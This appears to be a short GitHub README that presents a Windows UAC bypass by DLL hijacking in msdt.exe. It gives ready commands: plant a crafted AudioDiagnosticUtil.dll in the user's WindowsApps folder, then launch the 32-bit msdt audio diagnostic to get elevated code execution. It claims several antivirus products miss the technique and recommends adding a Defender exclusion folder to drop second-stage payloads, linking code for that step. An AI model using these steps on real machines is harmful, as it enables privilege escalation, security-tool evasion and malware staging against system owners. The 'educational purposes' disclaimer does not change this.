During research into new UAC bypass methods, I found that when launching:

```cmd
c:\windows\syswow64\msdt.exe -path C:\WINDOWS\diagnostics\index\AudioRecordingDiagnostic.xml -skip yes
```

the elevated process searches for DLLs in writable paths. This can lead us to code execution with elevated privileges.

To test it, compile the DLL as x86 AudioDiagnosticUtil.dll.


Logically very close to https://blog.sevagas.com/?MSDT-DLL-Hijack-UAC-bypass, but technically this is a new method. Very strange it wasn't discovered earlier

Bluetooth must be disabled on the machine




```cmd
copy AudioDiagnosticUtil.dll %LOCALAPPDATA%\Microsoft\WindowsApps\AudioDiagnosticUtil.dll
c:\windows\syswow64\msdt.exe -path C:\WINDOWS\diagnostics\index\AudioRecordingDiagnostic.xml -skip yes
```
<img width="2079" height="654" alt="Снимок экрана 2026-11-02 214519" src="https://github.com/user-attachments/assets/e3feeca7-128c-48e1-bf3f-d1b12135c7b4" />

Work on windows 10/11 

Windows Defender, Kaspersky, ElasticEdr, Avast not detecting this technique

Add folder in exclusion to wd for dropoing second stage builds

https://github.com/MemDecompression/msdt-new-uac/blob/main/defender.cpp


only for educational purposes


